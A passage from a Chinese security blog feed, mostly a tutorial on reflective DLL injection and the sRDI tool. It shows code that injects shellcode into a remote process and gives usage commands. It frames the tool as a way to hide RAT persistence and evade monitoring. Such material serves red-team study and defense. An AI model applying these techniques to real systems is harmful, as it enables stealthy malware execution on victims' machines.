&amp;lt;img src=&amp;#34;data:image/gif;base64,xxx...xxx==&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;那么为什么要使用 base64 传输图片文件？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;前面也说到了，因为这样可以节省一个 http 请求。图片的 base64 编码可以算是前端优化的一环。效益虽小，但却缺能积少成多。&lt;/p&gt;&lt;p&gt;&lt;b&gt;三：一些接口中的参数使用 base64 编码&lt;/b&gt;&lt;/p&gt;&lt;p&gt;从长度上来说，这样做视乎并不能减少数据长度而达到缩小数据包提高传输速率的目的，那为什么那些参数需要使用 base64 编码呢？&lt;/p&gt;&lt;ul&gt;&lt;li&gt;编码，进行简单的算法（几乎不影响效率）&lt;/li&gt;&lt;li&gt;算法可逆，可编码可解码，不影响通信&lt;/li&gt;&lt;li&gt;编码后，肉眼无法读取其原始内容&lt;/li&gt;&lt;li&gt;加密后的字符串只有[0-9a-zA-Z+/=]，不可打印字符(包括转移字符)也可传输&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;简单来说，base64 可以消除数据传输上的一切“妖魔鬼怪”，达到“天下大同”的目的。&lt;/blockquote&gt;&lt;p&gt;又比如有些文本协议不支持不可见字符的传递，只能用大于32的可见字符来传递信息（协议规定），所以还是会用上 base64 编码。&lt;/p&gt;&lt;p&gt;有关 &lt;b&gt;base64&lt;/b&gt; 的内容就简单介绍到这里。更多有关 CTF 的内容请前往 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2019-12-11-96725834</guid>
<pubDate>Wed, 11 Dec 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>反射型DLL注入工具-sRDI</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-12-10-96484140.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/96484140&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-241f58bad8b2b3d68da48e35e921a461_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;反射型DLL注入💉&lt;/h2&gt;&lt;p&gt;&lt;b&gt;DLL 注入&lt;/b&gt;&lt;/p&gt;&lt;p&gt;首先，我们需要了解什么是反射型DLL注入。&lt;/p&gt;&lt;blockquote&gt;DLL 注入&lt;br/&gt;就是将 DLL（动态链接库，是一个包含可由多个程序，同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32.dll 执行与对话框有关的常见函数。）放进某个进程的地址空间里，让它成为那个进程的一部分。要实现 DLL 注入，首先需要打开目标进程。&lt;/blockquote&gt;&lt;p&gt;DLL 注入也被很多合法软件广泛的使用，但恶意软件通常采用 DLL 注入在另一进程的存储空间内伪装其操作。DLL 注入是一个过程，该过程使另一个正在运行的进程加载并执行注入者的任何代码。看上去相当的危险，但它也有很多合法用途。例如，没有它，debug 调试器就不能运行。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f59f2948668591193efd91837a2c76c2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;817&quot; data-rawheight=&quot;1057&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;817&quot; data-original=&quot;https://pic3.zhimg.com/v2-f59f2948668591193efd91837a2c76c2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f59f2948668591193efd91837a2c76c2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;817&quot; data-rawheight=&quot;1057&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;817&quot; data-original=&quot;https://pic3.zhimg.com/v2-f59f2948668591193efd91837a2c76c2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f59f2948668591193efd91837a2c76c2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;实现 DLL 注入可参考：&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blog.opensecurityresearch.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/2013/01/windows-dll-injection-basics.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;反射型 DLL 注入&lt;/b&gt;&lt;/p&gt;&lt;p&gt;反射DLL注入用于将DLL加载到进程中，而不必将其放置在主机的文件系统上。&lt;/p&gt;&lt;p&gt;反射 DLL 注入的过程如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;使用 RWX 权限打开目标进程，并为 DLL 分配足够大的内存。&lt;/li&gt;&lt;li&gt;将 DLL 复制到分配的内存空间中。&lt;/li&gt;&lt;li&gt;计算 DLL 中用于执行反射加载的导出的内存偏移量。&lt;/li&gt;&lt;li&gt;使用反射性加载器函数的偏移地址作为入口，调用 CreateRemoteThread（或等效的未公开的 API 函数，如 RtlCreateUserThread）开始在远程进程中执行。&lt;/li&gt;&lt;li&gt;反射式加载器功能使用适当的 CPU 寄存器查找目标进程的进程环境块（PEB），并使用该寄存器在内存 kernel32.dll 和任何其他所需库中查找地址。&lt;/li&gt;&lt;li&gt;解析的 KERNEL32 出口目录中找到所需的 API 功能，如内存地址 LoadLibraryA，GetProcAddress和VirtualAlloc。&lt;/li&gt;&lt;li&gt;然后使用这些函数将 DLL（自身）正确加载到内存中，并调用其入口点 DllMain。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这一过程比较复杂，值得深思。&lt;/p&gt;&lt;blockquote&gt;反射型 DLL 注入：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/stephenfewer/ReflectiveDLLInjection&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/stephenfewer&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/ReflectiveDLLInjection&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;反射型 DLL 注入的假设是，调用 DLL 的入口点足以执行 DLL 的全部功能。但是，往往并非如此。Microsoft 建议开发人员尽量减少在 DllMain 中的工作量，并进行“延迟初始化”，避免加载其他库或创建新线程。然后，主要入口点位于另一个函数中，该函数在 DLL 加载后将单独调用。&lt;/p&gt;&lt;p&gt;有人提出一种更强大的 DLL 注入技术，该技术试图遵循 Microsoft 概述的 DLL 最佳实践。它通过向目标进程动态写入一些引导程序 Shellcode 来实现此目的，该进程将加载 DLL（使用LoadLibraryA），然后查找并调用另一个导出的入口点函数（使用 GetProcAddress）。尽管这是对传统 DLL 注入的重大改进，但不是反射型的。&lt;/p&gt;&lt;p&gt;因此，将这一技术进行改进，来实现更完美的反射型 DLL 注入。&lt;/p&gt;&lt;blockquote&gt;来源：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;disman.tl/2015/01/30/an&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;-improved-reflective-dll-injection-technique.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;怎样实现反射型 DLL 注入？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;其基本过程如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;打开目标进程并分配内存。&lt;/li&gt;&lt;li&gt;将 DLL 复制到分配的内存中。&lt;/li&gt;&lt;li&gt;将入口点函数名称的哈希值和该函数的所有参数复制到 DLL 之后的内存空间中。&lt;/li&gt;&lt;li&gt;复制一些引导程序的 shellcode，该 shellcode 调用带有指向在第3步中复制的数据的指针的修改的反射式加载器。&lt;/li&gt;&lt;li&gt;使用 shellcode 开头的地址作为入口点，在目标进程中创建一个远程线程。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;需要引导程序 Shellcode 的原因是由于我们能够使用 Stephen Fewer 的原始反射 DLL 注入技术传递给反射加载器的数据量有限。&lt;/p&gt;&lt;p&gt;CreateRemoteThread 具有以下声明：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;HANDLE WINAPI CreateRemoteThread(
  _In_   HANDLE hProcess,
  _In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,
  _In_   SIZE_T dwStackSize,
  _In_   LPTHREAD_START_ROUTINE lpStartAddress,
  _In_   LPVOID lpParameter,
  _In_   DWORD dwCreationFlags,
  _Out_  LPDWORD lpThreadId
);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中 LPTHREAD_START_ROUTINE lpStartAddress 是所创建的线程的执行入口点。该函数的原型为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;typedef DWORD (__stdcall *LPTHREAD_START_ROUTINE) (
[in] LPVOID lpThreadParameter
);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如上，这仅需要一个 LPVOID 参数。反射型 DLL 注入技术将反射型加载器的地址 CreateRemoteThread 作为 lpStartAddress 参数传递，因此它只能传递单个 void 指针。这将有利于反射型加载器仅调用 DllMain，而后者将 void 指针作为其 lpvReserved 参数。&lt;/p&gt;&lt;p&gt;但是，如果我们希望反射型加载器在加载 DLL 之后调用其他导出，则需要为其提供更多信息！我们将通过使用一些引导程序 Shellcode 将其他参数传递给反射型加载器函数来实现。因此反射型加载器函数将声明：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;DWORD WINAPI ReflectiveLoader( LPVOID lpParameter, LPVOID lpLibraryAddress, DWORD dwFunctionHash, LPVOID lpUserData, DWORD nUserdataLen );&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在这里的 dwFunctionHash 是要调用的导出函数名称的哈希值，lpUserData 是一堆数据（大小为nUserdataLen），当反射加载程序调用导出函数时，我们将其传递给该函数。&lt;/p&gt;&lt;p&gt;下面，我们不仅要在 DLL 的远程进程中分配内存，我们还要包括用于 shellcode（64字节就足够了）和一定的数据空间：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;DWORD nBufferSize = dwLength // size of the DLL
    + nUserdataLen
    + 64; // shellcode buffer

// alloc memory (RWX) in the host process for the image...
lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, nBufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if (!lpRemoteLibraryBuffer)
    break;
printf(&amp;#34;Allocated memory address in remote process: 0x%p\n&amp;#34;, lpRemoteLibraryBuffer);

// write the image into the host process...
if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
    break;

ULONG_PTR uiReflectiveLoaderAddr = (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset;

// write our userdata blob into the host process
ULONG_PTR userdataAddr = (ULONG_PTR)lpRemoteLibraryBuffer + dwLength;
if (!WriteProcessMemory(hProcess, (LPVOID)userdataAddr, lpUserdata, nUserdataLen, NULL))
    break;

ULONG_PTR uiShellcodeAddr = userdataAddr + nUserdataLen;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Shellcode 将有两个目标：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;使用我们的附加参数调用反射型加载器函数&lt;/li&gt;&lt;li&gt;ExitThread() 进行适当的清理，以便我们可以从调用过程中获取线程的退出代码。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;首先，我们获得的内存地址 ExitThread，该内存地址对于每个进程都应该相同（因为大多数（几乎所有）进程都加载了 kernel32.dll）。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;HMODULE kernel32 = LoadLibraryA(&amp;#34;kernel32.dll&amp;#34;); 
FARPROC exitthread = GetProcAddress(kernel32, &amp;#34;ExitThread&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来，我们将引导程序 Shellcode 写入缓冲区，然后将其写入分配的远程进程内存空间。shellcode 的 x86 版本很简单，因为我们只需要在调用反射加载程序之前以相反的顺序（按照__stdcall 调用约定）将参数推入堆栈即可，x64 shellcode 更为复杂，因为调用约定要求使用寄存器来传递参数。&lt;/p&gt;&lt;p&gt;最后，我们将 shellcode 写入远程进程，并创建一个使用 shellcode 地址作为入口点的远程线程：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;// finally, write our shellcode into the host process
if (!WriteProcessMemory(hProcess, (LPVOID)uiShellcodeAddr, bootstrap, i, NULL))
    break;

// Make sure our changes are written right away
FlushInstructionCache(hProcess, lpRemoteLibraryBuffer, nBufferSize);

// create a remote thread in the host process to call the ReflectiveLoader!
hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)uiShellcodeAddr, lpParameter, (DWORD)NULL, &amp;amp;dwThreadId);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;反射型加载器功能本身与 Fewer 的原始版本相比没有太大变化，除了传递给它的附加参数以及随后在 DLL 中调用选择的导出的部分外。加载 DLL 之后，它将调用 DllMain（理想情况下为null），然后调用我们的导出。&lt;/p&gt;&lt;p&gt;下面就介绍今天的主角：&lt;/p&gt;&lt;h2&gt;sRDI✨（Shellcode反射DLL注入）&lt;/h2&gt;&lt;p&gt;它可以基于 Shellcode 实现反射型 DLL 注入，并且能够将 DLL 转换为独立的 Shellcode。&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/monoxgas/sRDI&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/monoxgas/sRD&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;如果我们不想接触磁盘，则需要某种注入技术。可以写一个反射型加载的 DLL，但是反射性 DLL 注入会留下可以检测到的内存伪像。&lt;/p&gt;&lt;p&gt;而 sRDI 可以把一个普通的 DLL 文件转换为一段不依赖任何位置的 Shellcode。&lt;/p&gt;&lt;p&gt;相对于标准 RDI，使用 sRDI 的一些优点：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;你可以转换任何 DLL为无位置依赖的 shellcode，并且可以使用标准的 shellcode 注入技术来使用它。&lt;/li&gt;&lt;li&gt;你的 DLL 中不需要写任何反射加载器代码，因为反射加载器是在 DLL 外部的 shellcode 中实现的。&lt;/li&gt;&lt;li&gt;合理使用权限，没有大量的 RWX 权限数据。&lt;/li&gt;&lt;li&gt;还可以根据选项，抹掉 PE 头特征。 &lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;组成简介🎨&lt;/h2&gt;&lt;p&gt;sRDI 的所有功能基于以下两个组件：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;一个C语言项目，可将 PE Loader 编译为 Shellcode&lt;/li&gt;&lt;li&gt;转换代码负责将 DLL、RDI 和用户数据进行绑定&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;由以下元素组成：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;ShellcodeRDI：&lt;/b&gt;编译 DLL 加载器的 Shellcode&lt;/li&gt;&lt;li&gt;&lt;b&gt;NativeLoader：&lt;/b&gt;需要时，将 DLL 转换为 shellcode，然后注入内存&lt;/li&gt;&lt;li&gt;&lt;b&gt;DotNetLoader：&lt;/b&gt;NativeLoader 的 C＃ 实现&lt;/li&gt;&lt;li&gt;&lt;b&gt;Python \ ConvertToShellcode.py：&lt;/b&gt;将 DLL 转换为 shellcode&lt;/li&gt;&lt;li&gt;&lt;b&gt;Python \ EncodeBlobs.py：&lt;/b&gt;对已编译的 sRDI 进行编码，进行静态嵌入&lt;/li&gt;&lt;li&gt;&lt;b&gt;PowerShell \ ConvertTo-Shellcode.ps1：&lt;/b&gt;将 DLL 转换为 shellcode&lt;/li&gt;&lt;li&gt;&lt;b&gt;FunctionTest：&lt;/b&gt;导入 sRDI 的 C 函数，进行调试测试&lt;/li&gt;&lt;li&gt;&lt;b&gt;TestDLL：&lt;/b&gt;示例DLL，包括两个导出函数，用于后续的加载和调用&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;&lt;b&gt;DLL 不需要使用 RDI 进行编译，但是该技术具有交叉兼容性。&lt;/b&gt;&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;优势💎&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;＃1 – 隐秘的持久性&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;使用服务器端 Python 代码（sRDI）将 RAT 转换为 shellcode&lt;/li&gt;&lt;li&gt;将 shellcode 写入注册表&lt;/li&gt;&lt;li&gt;设置计划的任务以执行基本的加载程序 DLL&lt;/li&gt;&lt;li&gt;加载程序读取 shellcode 并注入（少于20行C代码）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;优点：&lt;/b&gt; RAT 或加载器都不需要了解 RDI 或使用 RDI 进行编译。装载机可以保持小巧而简单，避免警告。&lt;/p&gt;&lt;p&gt;&lt;b&gt;#2 – 侧面加载&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;让你的 RAT 在内存中运行&lt;/li&gt;&lt;li&gt;编写 DLL 以执行额外的功能&lt;/li&gt;&lt;li&gt;将 DLL 转换为 shellcode（使用 sRDI）并本地注入&lt;/li&gt;&lt;li&gt;使用 GetProcAddressR 查找导出的函数&lt;/li&gt;&lt;li&gt;执行 X 次附加功能，而无需重新加载 DLL&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;优点： &lt;/b&gt;使您的初始工具更轻巧，并根据需要添加功能。加载一次 DLL 并像使用其他任何 DLL 一样使用它。&lt;/p&gt;&lt;p&gt;&lt;b&gt;＃3 – 依赖关系&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;从磁盘读取现有的合法 API DLL&lt;/li&gt;&lt;li&gt;将 DLL 转换为 shellcode（使用 sRDI）并将其加载到内存中&lt;/li&gt;&lt;li&gt;使用 GetProcAddress 查找所需的功能&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;优点： &lt;/b&gt;避免使用监视工具来检测 LoadLibrary 调用。访问 API 函数而不会泄漏信息。（WinInet，PSApi，TlHelp32，GdiPlus）&lt;/p&gt;&lt;h2&gt;使用✔&lt;/h2&gt;&lt;h3&gt;使用 python 将 DLL 转换为 shellcode&lt;/h3&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;ShellcodeRDI&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;dll&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;TestDLL_x86.dll&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ConvertToShellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;使用 C＃ 加载程序将 DLL 加载到内存中&lt;/h3&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-csharp&quot;&gt;&lt;span class=&quot;n&quot;&gt;DotNetLoader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TestDLL_x64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dll&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;使用 python 脚本转换 DLL 并使用本机 EXE 加载&lt;/h3&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ConvertToShellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TestDLL_x64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dll&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;NativeLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TestDLL_x64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;使用 powershell 转换 DLL 并使用 Invoke-Shellcode 加载&lt;/h3&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Import-Module .\Invoke-Shellcode.ps1
Import-Module .\ConvertTo-Shellcode.ps1
Invoke-Shellcode -Shellcode (ConvertTo-Shellcode -File TestDLL_x64.dll)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;搭建🔨&lt;/h2&gt;&lt;p&gt;sRDI 是使用Visual Studio 2015（v140）和 Windows SDK 8.1 构建的。python 脚本是使用 Python 3 编写的。&lt;/p&gt;&lt;p&gt;Python和Powershell脚本位于：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Python\ConvertToShellcode.py&lt;/li&gt;&lt;li&gt;PowerShell\ConvertTo-Shellcode.ps1&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;构建项目后，其他二进制文件将位于：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;bin\NativeLoader.exe&lt;/li&gt;&lt;li&gt;bin\DotNetLoader.exe&lt;/li&gt;&lt;li&gt;bin\TestDLL_&amp;lt;arch&amp;gt;.dll&lt;/li&gt;&lt;li&gt;bin\ShellcodeRDI_&amp;lt;arch&amp;gt;.bin &lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;测试test⌛&lt;/h2&gt;&lt;p&gt;让我们编译一个简单的 x86 DLL，执行弹出 2 个记事本进程：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-241f58bad8b2b3d68da48e35e921a461_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;815&quot; data-rawheight=&quot;418&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;815&quot; data-original=&quot;https://pic2.zhimg.com/v2-241f58bad8b2b3d68da48e35e921a461_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-241f58bad8b2b3d68da48e35e921a461_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;815&quot; data-rawheight=&quot;418&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;815&quot; data-original=&quot;https://pic2.zhimg.com/v2-241f58bad8b2b3d68da48e35e921a461_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-241f58bad8b2b3d68da48e35e921a461_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;将 DLL 转换为 shellcode。我们将得到一个以十进制值表示的 shellcode 字节数组：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$sc = ConvertTo-Shellcode \\VBOXSVR\Experiments\messagebox\messagebox\Debug\messagebox.dll&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1b2ddb8ced35677c712b90731ace424f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;513&quot; data-rawheight=&quot;337&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;513&quot; data-original=&quot;https://pic4.zhimg.com/v2-1b2ddb8ced35677c712b90731ace424f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1b2ddb8ced35677c712b90731ace424f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;513&quot; data-rawheight=&quot;337&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;513&quot; data-original=&quot;https://pic4.zhimg.com/v2-1b2ddb8ced35677c712b90731ace424f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-1b2ddb8ced35677c712b90731ace424f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;让我们将它们转换为十六进制：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$sc2 = $sc | % { write-output ([System.String]::Format(&amp;#39;{0:X2}&amp;#39;, $_)) }&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-40e368ce9bbaf297bc8386c25c63744a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;177&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;500&quot; data-original=&quot;https://pic3.zhimg.com/v2-40e368ce9bbaf297bc8386c25c63744a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img 